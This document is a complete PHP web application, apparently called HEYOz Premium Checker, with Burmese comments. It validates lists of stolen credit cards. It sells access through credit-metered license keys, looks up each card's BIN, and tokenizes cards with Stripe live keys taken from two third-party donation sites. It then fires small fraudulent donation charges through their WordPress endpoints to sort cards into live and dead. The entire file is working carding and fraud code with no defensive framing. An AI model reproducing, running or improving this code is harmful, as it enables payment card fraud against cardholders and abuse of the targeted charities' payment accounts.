<?php
// --- 1. Session & Cookie Configuration (၇ ရက်အထိ မှတ်မိနေစေရန်) ---
$session_lifetime = 604800; 
ini_set('session.gc_maxlifetime', $session_lifetime);
session_set_cookie_params([
    'lifetime' => $session_lifetime,
    'path' => '/',
    'domain' => $_SERVER['HTTP_HOST'],
    'secure' => false, 
    'httponly' => true,
    'samesite' => 'Lax'
]);

session_start();
error_reporting(0);
$key_file = 'keys.json';

// --- Functions for Database ---
function get_keys() {
    global $key_file;
    if (!file_exists($key_file)) return [];
    return json_decode(file_get_contents($key_file), true) ?: [];
}

function save_keys($keys) {
    global $key_file;
    file_put_contents($key_file, json_encode($keys, JSON_PRETTY_PRINT));
}

// Logout လုပ်လျှင် Lock ကိုပါ ဖြုတ်ပေးရန်
if (isset($_GET['logout'])) {
    $all_keys = get_keys();
    $ckey = $_SESSION['user_key'];
    if (isset($all_keys[$ckey])) {
        $all_keys[$ckey]['session_id'] = ""; 
        save_keys($all_keys);
    }
    setcookie("active_key", "", time() - 3600, "/"); 
    session_destroy();
    header("Location: index.php");
    exit;
}

// --- Login Logic (Single User Device Lock with Cookie Persistence) ---
if (isset($_POST['login_key'])) {
    $input_key = trim($_POST['key']);
    $all_keys = get_keys();
    
    if (isset($all_keys[$input_key])) {
        if (date('Y-m-d') > $all_keys[$input_key]['expiry']) {
            $error = "Key Expired!";
        } elseif ($all_keys[$input_key]['credits'] < 5) {
            $error = "Insufficient Credits (Min 5)!";
        } 
        elseif (!empty($all_keys[$input_key]['session_id']) && $all_keys[$input_key]['session_id'] !== session_id() && $_COOKIE['active_key'] !== $input_key) {
            $error = "Key is already used by another device!";
        } else {
            $all_keys[$input_key]['session_id'] = session_id();
            save_keys($all_keys);
            setcookie("active_key", $input_key, time() + 604800, "/");
            $_SESSION['user_key'] = $input_key;
            $_SESSION['logged_in'] = true;
        }
    } else { $error = "Invalid License Key!"; }
}

// --- Persistence Check (Browser ပြန်ဖွင့်လျှင် Auto-Login) ---
if (!isset($_SESSION['logged_in']) && isset($_COOKIE['active_key'])) {
    $ckey = $_COOKIE['active_key'];
    $all_keys = get_keys();
    if (isset($all_keys[$ckey]) && date('Y-m-d') <= $all_keys[$ckey]['expiry'] && $all_keys[$ckey]['credits'] >= 5) {
        $all_keys[$ckey]['session_id'] = session_id();
        save_keys($all_keys);
        $_SESSION['user_key'] = $ckey;
        $_SESSION['logged_in'] = true;
    }
}

// Auto-Check Validity
if (isset($_SESSION['logged_in'])) {
    $ckey = $_SESSION['user_key'];
    $all_keys = get_keys();
    if (!isset($all_keys[$ckey]) || date('Y-m-d') > $all_keys[$ckey]['expiry'] || $all_keys[$ckey]['credits'] < 5 || $all_keys[$ckey]['session_id'] !== session_id()) {
        session_destroy();
        setcookie("active_key", "", time() - 3600, "/");
        header("Location: index.php");
        exit;
    }
}

// Login Form UI
if (!isset($_SESSION['logged_in'])) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - HEYOz</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        body { background: #080a0f; color: #c9d1d9; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .login-box { background: rgba(22, 27, 34, 0.8); backdrop-filter: blur(10px); padding: 40px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); width: 340px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
        .logo-icon { font-size: 50px; color: #58a6ff; margin-bottom: 20px; text-shadow: 0 0 20px rgba(88, 166, 255, 0.5); }
        h2 { margin-bottom: 25px; font-weight: 600; letter-spacing: 1px; }
        input { width: 100%; padding: 15px; margin: 10px 0; background: rgba(1, 4, 9, 0.5); border: 1px solid #30363d; color: #58a6ff; border-radius: 12px; box-sizing: border-box; text-align: center; font-size: 16px; outline: none; transition: 0.3s; }
        button { width: 100%; padding: 15px; background: linear-gradient(45deg, #238636, #2ea043); color: white; border: none; border-radius: 12px; cursor: pointer; font-weight: bold; font-size: 16px; transition: 0.3s; margin-top: 10px; }
        .err { color: #f85149; margin-bottom: 15px; font-size: 14px; font-weight: 500; background: rgba(248, 81, 73, 0.1); padding: 10px; border-radius: 8px; }
    </style></head>
    <body><div class="login-box">
    <div class="logo-icon"><i class="fa-solid fa-bolt-lightning"></i></div>
    <h2>HEYOz LOGIN</h2>
    <?php if(isset($error)) echo "<div class='err'>$error</div>"; ?>
    <form method="POST"><input type="text" name="key" placeholder="Enter License Key" required><button type="submit" name="login_key">Authorize Access</button></form>
    </div></body></html>
    <?php exit;
}

// Logic ပိုင်းများ (Stripe Checker API)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['login_key'])) {
    header("Content-Type: application/json");
    $ckey = $_SESSION['user_key'];
    $all_keys = get_keys();
    if ($all_keys[$ckey]['credits'] < 5 || $all_keys[$ckey]['session_id'] !== session_id()) {
        echo json_encode(["status" => "LOGOUT", "msg" => "Account Locked!"]); exit;
    }
    $data = json_decode(file_get_contents('php://input'), true);
    $ccx = $data['card'] ?? "";
    $gate = $data['gate'] ?? "gate1"; 
    
    // Formatting CC
    if (preg_match('/(\d{15,16})[\s|:|\\/]+(\d{1,2})[\s|:|\\/]+(\d{2,4})[\s|:|\\/]+(\d{3,4})/', $ccx, $matches)) {
        $cc = $matches[1]; $mes = $matches[2]; $ano = $matches[3]; $cvv = $matches[4];
    } else {
        preg_match_all("/(\d+)/", $ccx, $list);
        if (count($list[0]) < 4) { echo json_encode(["status" => "DEAD", "msg" => "Invalid Format"]); exit; }
        $cc = $list[0][0]; $mes = $list[0][1]; $ano = $list[0][2]; $cvv = $list[0][3];
    }
    if (strlen($mes) == 1) $mes = "0" . $mes;
    if (strlen($ano) == 4) $ano = substr($ano, 2);

    // BIN Lookup (Using bins.antipublic.cc to avoid BIN LIMIT)
    $bin = substr($cc, 0, 6);
    $ch_bin = curl_init("https://bins.antipublic.cc/bins/" . $bin);
    curl_setopt($ch_bin, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch_bin, CURLOPT_TIMEOUT, 5);
    $bin_res = json_decode(curl_exec($ch_bin), true);
    curl_close($ch_bin);
    if ($bin_res && isset($bin_res['brand'])) {
        $brand = strtoupper($bin_res['brand'] ?? 'UNK');
        $bank = $bin_res['bank'] ?? 'Unknown Bank';
        $country = $bin_res['country_flag'] ?? '🏳️';
        $bin_info = "[$brand - $bank $country]";
    } else {
        $f = substr($cc, 0, 1);
        $fallback_brand = ($f == '4') ? "VISA" : (($f == '5') ? "MASTER" : "UNK");
        $bin_info = "[$fallback_brand - BIN ERROR]";
    }

    $email = 'jhsha' . rand(100, 999) . '@gmail.com';
    $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';

    if ($gate == "gate1") {
        $pk = 'pk_live_51LTAH3KQqBJAM2n1ywv46dJsjQWht8ckfcm7d15RiE8eIpXWXUvfshCKKsDCyFZG48CY68L9dUTB0UsbDQe32Zn700Qe4vrX0d';
        $site_origin = 'https://texassouthernacademy.com';
    } else {
        $pk = 'pk_live_51MrJUoFYWOfRAL36tEpAYV8qK1PEbiqp3QXs3wjZTLCImyIh2mmkYi8nW2tZBVvfgZG7UVaurtWfwkigqQAD6KJg00VB6fcBoS';
        $site_origin = 'https://christiantvireland.ie';
    }

    $ch1 = curl_init('https://api.stripe.com/v1/payment_methods');
    curl_setopt($ch1, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch1, CURLOPT_POST, true);
    curl_setopt($ch1, CURLOPT_HTTPHEADER, ['authority: api.stripe.com','accept: application/json','content-type: application/x-www-form-urlencoded','origin: ' . $site_origin,'referer: https://js.stripe.com/','user-agent: ' . $ua]);
    curl_setopt($ch1, CURLOPT_POSTFIELDS, http_build_query(['type' => 'card','billing_details[name]' => 'John Steve','card[number]' => $cc,'card[cvc]' => trim($cvv),'card[exp_month]' => $mes,'card[exp_year]' => $ano,'key' => $pk,'payment_user_agent' => 'stripe.js/a3e7d2f3d5; stripe-js-v3/a3e7d2f3d5; card-element']));
    $res1 = json_decode(curl_exec($ch1), true);
    $pm = $res1['id'] ?? null;

    if (!$pm) { $err = $res1['error']['message'] ?? "Tokenization Restricted"; echo json_encode(["status" => "DEAD", "msg" => "$err $bin_info ( HEYOz🔥 )"]); exit; }

    if ($gate == "gate1") {
        $target = 'https://texassouthernacademy.com/wp-admin/admin-ajax.php';
        $fields = ['action' => 'wp_full_stripe_inline_donation_charge', 'wpfs-form-name' => 'donate','wpfs-form-get-parameters' => '%7B%7D', 'wpfs-custom-amount' => 'other', 'wpfs-custom-amount-unique' => '1','wpfs-donation-frequency' => 'one-time', 'wpfs-billing-name' => 'John Steve','wpfs-billing-address-country' => 'US', 'wpfs-billing-address-line-1' => '123 Wailiam street','wpfs-billing-address-city' => 'NewYork', 'wpfs-billing-address-state-select' => 'NY','wpfs-billing-address-zip' => '10038', 'wpfs-card-holder-email' => $email,'wpfs-card-holder-name' => 'John Steve', 'wpfs-stripe-payment-method-id' => $pm,];
    } else {
        $target = 'https://christiantvireland.ie/wp-admin/admin-ajax.php';
        $fields = ['action' => 'wp_full_stripe_inline_donation_charge', 'wpfs-form-name' => 'website_donation','wpfs-form-get-parameters' => '{}', 'wpfs-custom-amount' => 'other', 'wpfs-custom-amount-unique' => '0.5','wpfs-donation-frequency' => 'one-time', 'wpfs-card-holder-email' => $email, 'wpfs-card-holder-name' => 'John Steve','wpfs-stripe-payment-method-id' => $pm];
    }

    $ch2 = curl_init($target);
    curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch2, CURLOPT_POST, true);
    curl_setopt($ch2, CURLOPT_HTTPHEADER, ['origin: ' . $site_origin,'referer: ' . $site_origin,'user-agent: ' . $ua,'x-requested-with: XMLHttpRequest']);
    curl_setopt($ch2, CURLOPT_POSTFIELDS, http_build_query($fields));
    $res2 = json_decode(curl_exec($ch2), true);
    $msg = $res2['message'] ?? "No Response";

    if (stripos($msg, "Successful") !== false || stripos($msg, "thank you") !== false) { 
        $st = "LIVE"; $m = "CHARGED 🔥"; 
        $all_keys = get_keys(); $all_keys[$ckey]['credits'] -= 5; save_keys($all_keys);
    }
    elseif (stripos($msg, "insufficient") !== false) { $st = "INSUF"; $m = "LOW FUNDS 💰"; }
    elseif (stripos($msg, "action") !== false || stripos($msg, "authentication") !== false) { $st = "CVV"; $m = "3Ds/CCN 🛡️"; }
    else { $st = "DEAD"; $m = $msg; }

    $rem_c = get_keys()[$ckey]['credits'];
    echo json_encode(["status" => $st, "msg" => "$m (Credits: $rem_c) $bin_info ( HEYOz🔥 )"]); exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚡ HEYOz PREMIUM CHECKER ⚡</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        :root { --bg: #0d1117; --card: #161b22; --border: #30363d; --text: #c9d1d9; --accent: #58a6ff; }
        * { box-sizing: border-box; }
        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', sans-serif; padding: 15px; margin: 0; display: flex; justify-content: center; }
        .wrapper { width: 100%; max-width: 900px; animation: fadeIn 0.8s ease; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        
        /* Header Styling */
        .header-flex { display: flex; justify-content: space-between; align-items: center; background: #161b22; padding: 12px 20px; border-radius: 12px; border: 1px solid var(--border); margin-bottom: 20px; }
        h1 { font-size: 1.2rem; color: var(--accent); margin: 0; text-transform: uppercase; letter-spacing: 1px; }

        /* Modernized Credit Box */
        .credit-container { background: rgba(88, 166, 255, 0.1); border: 1px solid rgba(88, 166, 255, 0.3); padding: 6px 15px; border-radius: 10px; text-align: center; }
        .credit-title { font-size: 10px; color: #8b949e; text-transform: uppercase; letter-spacing: 1px; display: block; margin-bottom: -2px; }
        .credit-amount { color: var(--accent); font-weight: 800; font-size: 16px; }

        /* Modern Logout Button */
        .btn-logout { color: #f85149; text-decoration: none; font-size: 12px; font-weight: bold; border: 1.5px solid rgba(248, 81, 73, 0.5); padding: 8px 16px; border-radius: 8px; transition: 0.3s; text-transform: uppercase; }
        .btn-logout:hover { background: rgba(248, 81, 73, 0.1); border-color: #f85149; box-shadow: 0 0 10px rgba(248, 81, 73, 0.2); }

        #status-display { background: #010409; border: 1px solid var(--accent); padding: 12px; border-radius: 12px; text-align: center; margin-bottom: 15px; font-family: monospace; color: var(--accent); font-weight: bold; min-height: 45px; }
        .gate-select { width: 100%; background: var(--card); color: var(--accent); border: 1px solid var(--border); padding: 12px; border-radius: 10px; margin-bottom: 15px; font-weight: bold; outline: none; cursor: pointer; transition: 0.3s; }
        .input-group { position: relative; }
        textarea { width: 100%; height: 160px; background: #010409; color: var(--accent); border: 1px solid var(--border); padding: 15px; border-radius: 12px; font-family: monospace; resize: none; outline: none; transition: 0.3s; }
        .upload-area { text-align: right; margin-top: -38px; margin-right: 15px; position: relative; z-index: 5; }
        .btn-upload { background: #30363d; color: #c9d1d9; padding: 6px 12px; border-radius: 8px; cursor: pointer; font-size: 11px; font-weight: bold; border: 1px solid var(--border); }
        .controls { display: flex; gap: 12px; margin: 20px 0; }
        #btn { flex: 2; background: linear-gradient(45deg, #238636, #2ea043); color: white; border: none; padding: 15px; border-radius: 12px; cursor: pointer; font-weight: bold; font-size: 1rem; transition: 0.3s; }
        #stopBtn { flex: 1; background: #da3633; color: white; border: none; padding: 15px; border-radius: 12px; cursor: pointer; font-weight: bold; display: none; }
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(110px, 1fr)); gap: 12px; margin-bottom: 25px; }
        .stat-box { background: var(--card); border: 1px solid var(--border); padding: 15px; border-radius: 15px; text-align: center; transition: 0.3s; }
        .stat-box small { font-size: 10px; color: #8b949e; text-transform: uppercase; display: block; margin-bottom: 5px; }
        .stat-box span { font-size: 22px; font-weight: bold; display: block; }
        .result-box { background: var(--card); border: 1px solid var(--border); border-radius: 15px; margin-bottom: 12px; overflow: hidden; box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
        .res-head { padding: 14px 18px; font-weight: bold; font-size: 13px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; transition: 0.3s; background: rgba(255,255,255,0.02); }
        .res-body { display: none; padding: 10px; font-family: monospace; font-size: 12px; border-top: 1px solid var(--border); background: #0d1117; max-height: 300px; overflow-y: auto; }
        .LIVE { color: #3fb950; } .INSUF { color: #d29922; } .CVV { color: #58a6ff; } .DEAD { color: #f85149; }
        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-thumb { background: #30363d; border-radius: 10px; }
    </style>
</head>
<body>
<div class="wrapper">
    <div class="header-flex">
        <h1><i class="fa-solid fa-bolt-lightning"></i> HEYOz PREMIUM</h1>
        
        <div style="display: flex; align-items: center; gap: 15px;">
            <div class="credit-container">
                <span class="credit-title"><i class="fa-solid fa-coins"></i> Credits</span>
                <span class="credit-amount"><?php echo number_format(get_keys()[$_SESSION['user_key']]['credits']); ?></span>
            </div>
            
            <a href="?logout=1" class="btn-logout">Logout</a>
        </div>
    </div>
    
    <div id="status-display">SYSTEM ONLINE | READY TO SCAN</div>

    <select id="gate" class="gate-select">
        <option value="gate1">🛡️ GATE 1: STRIPE $1.00 (Charge)</option>
        <option value="gate2">🛡️ GATE 2: STRIPE $0.50 (Charge)</option>
    </select>

    <div class="input-group">
        <textarea id="list" placeholder="CC|MM|YY|CVV"></textarea>
        <div class="upload-area">
            <label for="fileInput" class="btn-upload">IMPORT .TXT</label>
            <input type="file" id="fileInput" accept=".txt" style="display: none;" onchange="handleFileUpload()">
        </div>
    </div>

    <div class="controls">
        <button id="btn" onclick="start()"><i class="fa-solid fa-play"></i> START CHECKING</button>
        <button id="stopBtn" onclick="stop()"><i class="fa-solid fa-stop"></i> STOP</button>
    </div>

    <div class="stats">
        <div class="stat-box"><small>Total</small><span id="c_total">0</span></div>
        <div class="stat-box"><small class="LIVE">Hit</small><span id="c_live" class="LIVE">0</span></div>
        <div class="stat-box"><small class="INSUF">Insuf</small><span id="c_insuf" class="INSUF">0</span></div>
        <div class="stat-box"><small class="CVV">3Ds</small><span id="c_cvv" class="CVV">0</span></div>
        <div class="stat-box"><small class="DEAD">Dead</small><span id="c_dead" class="DEAD">0</span></div>
    </div>

    <div class="result-box"><div class="res-head" style="color:#3fb950" onclick="toggleBox('l_live', this)"><span>HIT / CHARGED</span> <i class="fa-solid fa-chevron-down"></i></div><div class="res-body" id="l_live"></div></div>
    <div class="result-box"><div class="res-head" style="color:#d29922" onclick="toggleBox('l_insuf', this)"><span>INSUFFICIENT FUNDS</span> <i class="fa-solid fa-chevron-down"></i></div><div class="res-body" id="l_insuf"></div></div>
    <div class="result-box"><div class="res-head" style="color:#58a6ff" onclick="toggleBox('l_cvv', this)"><span>3Ds / CCN LIVE</span> <i class="fa-solid fa-chevron-down"></i></div><div class="res-body" id="l_cvv"></div></div>
    <div class="result-box"><div class="res-head" style="color:#f85149" onclick="toggleBox('l_dead', this)"><span>DECLINED</span> <i class="fa-solid fa-chevron-down"></i></div><div class="res-body" id="l_dead"></div></div>
</div>

<script>
    let counts = { LIVE: 0, INSUF: 0, CVV: 0, DEAD: 0 };
    let isRunning = false;

    // Upload function
    function handleFileUpload() {
        const fileInput = document.getElementById('fileInput');
        const textArea = document.getElementById('list');
        const file = fileInput.files[0];
        if (file) {
            const reader = new FileReader();
            reader.onload = function(e) {
                const lines = e.target.result.split('\n').filter(line => line.trim() !== "");
                textArea.value = lines.join('\n');
                document.getElementById('c_total').innerText = lines.length;
            };
            reader.readAsText(file);
        }
    }

    function toggleBox(id, header) {
        const body = document.getElementById(id);
        body.style.display = body.style.display === "block" ? "none" : "block";
    }

    function stop() { 
        isRunning = false; 
        const btn = document.getElementById('btn');
        btn.disabled = false;
        btn.innerHTML = '<i class="fa-solid fa-play"></i> START CHECKING';
        document.getElementById('stopBtn').style.display = 'none'; 
    }

    async function start() {
        const textArea = document.getElementById('list');
        const btn = document.getElementById('btn');
        const stopBtn = document.getElementById('stopBtn');
        
        let lines = textArea.value.split('\n').filter(l => l.trim() !== "");
        if (lines.length === 0) return;

        isRunning = true;
        
        // --- Button State Update ---
        btn.disabled = true;
        btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> SCANNING...';
        stopBtn.style.display = 'block';
        document.getElementById('c_total').innerText = lines.length;

        while (lines.length > 0 && isRunning) {
            let line = lines[0].trim();
            document.getElementById('status-display').innerText = "Checking: " + line;
            try {
                const res = await fetch(window.location.href, {
                    method: 'POST',
                    body: JSON.stringify({ card: line, gate: document.getElementById('gate').value }),
                    headers: { 'Content-Type': 'application/json' }
                });
                const data = await res.json();
                if (data.status === "LOGOUT") { location.reload(); return; }

                counts[data.status]++;
                const countElem = document.getElementById('c_' + data.status.toLowerCase());
                if (countElem) countElem.innerText = counts[data.status];

                const target = document.getElementById('l_' + data.status.toLowerCase());
                if (target) {
                    const item = document.createElement('div');
                    item.style.padding = "10px 0"; item.style.borderBottom = "1px solid #21262d";
                    item.innerHTML = `<span class="${data.status}">[${data.status}]</span> ${line} -> <span class="${data.status}">${data.msg}</span>`;
                    target.insertBefore(item, target.firstChild);
                }

                if(data.status === "LIVE") { 
                    setTimeout(() => { location.reload(); }, 1500); 
                }
                
                lines.shift();
                textArea.value = lines.join('\n');
                document.getElementById('c_total').innerText = lines.length;
            } catch (e) { isRunning = false; }
        }

        // --- End of Scan ---
        isRunning = false;
        btn.disabled = false;
        btn.innerHTML = '<i class="fa-solid fa-play"></i> START CHECKING';
        document.getElementById('status-display').innerText = "FINISH SCANNING";
        stopBtn.style.display = 'none';
    }
</script>
</body>
</html>
